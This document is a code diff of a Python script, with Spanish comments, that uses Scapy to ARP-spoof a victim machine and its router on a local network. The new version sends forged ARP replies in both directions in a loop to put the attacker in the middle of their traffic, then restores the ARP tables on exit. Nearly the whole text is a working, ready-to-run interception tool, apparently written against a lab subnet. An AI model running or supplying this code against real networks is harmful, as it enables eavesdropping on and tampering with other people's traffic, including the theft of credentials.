@@ -1,35 +1,55 @@
-import os
-import scapy.all as scapy
+from scapy.all import ARP, Ether, arping, send, conf
+import sys
 import time
 
 
-# Check for root privileges
-if not os.geteuid() == 0:
-  exit("This script requires root privileges. Run it again with sudo.")
-
-
 def get_mac(ip):
-  arp_request = scapy.ARP(pdst=ip)
-  broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-  arp_request_broadcast = broadcast / arp_request
-  answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-  return answered_list[0][1].hwsrc
+  # Enviar una solicitud ARP para obtener la dirección MAC de una IP
+  ans, _ = arping(ip, timeout=2, verbose=False)
+  for s, r in ans:
+    return r[Ether].src
+  return None
 
 
-def spoof(target_ip, spoof_ip, fake_mac):
-  router_mac = get_mac(spoof_ip)
-  packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=router_mac,
-                     psrc=target_ip, hwsrc=fake_mac)
-  scapy.send(packet, verbose=False)
+def spoof(target_ip, target_mac, source_ip):
+  # Crear y enviar paquetes ARP falsificados
+  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
+                     psrc=source_ip, op='is-at')
+  send(arp_response, verbose=False)
 
 
-fake_mac = "de:ad:be:ef:de:ad"  # Fake MAC address
-target_ip = "192.168.122.178"  # IP of the target machine
-gateway_ip = "192.168.122.1"  # IP of the router
+def restore(target_ip, target_mac, source_ip, source_mac):
+  # Restaurar la tabla ARP de la víctima
+  arp_response = ARP(pdst=target_ip, hwdst=target_mac,
+                     psrc=source_ip, hwsrc=source_mac, op='is-at')
+  send(arp_response, count=4, verbose=False)
 
-try:
-  while True:
-    spoof(target_ip, gateway_ip, fake_mac)
-    time.sleep(2)  # Add delay to avoid flooding the network
-except KeyboardInterrupt:
-  print("\nARP spoofing stopped.")
+
+if __name__ == "__main__":
+
+  victim_ip = '192.168.122.178'
+  router_ip = '192.168.122.1'
+  interface = 'enp1s0'
+
+  conf.iface = interface
+  conf.verb = 0
+
+  victim_mac = get_mac(victim_ip)
+  router_mac = get_mac(router_ip)
+
+  if victim_mac is None or router_mac is None:
+    print("No se pudo obtener la dirección MAC de la víctima o del router.")
+    sys.exit(1)
+
+  print("Iniciando ARP spoofing...")
+
+  try:
+    while True:
+      spoof(victim_ip, victim_mac, router_ip)
+      spoof(router_ip, router_mac, victim_ip)
+      time.sleep(2)
+  except KeyboardInterrupt:
+    print("Deteniendo ARP spoofing...")
+    restore(victim_ip, victim_mac, router_ip, router_mac)
+    restore(router_ip, router_mac, victim_ip, victim_mac)
+    print("Restaurado el estado original de la red.")
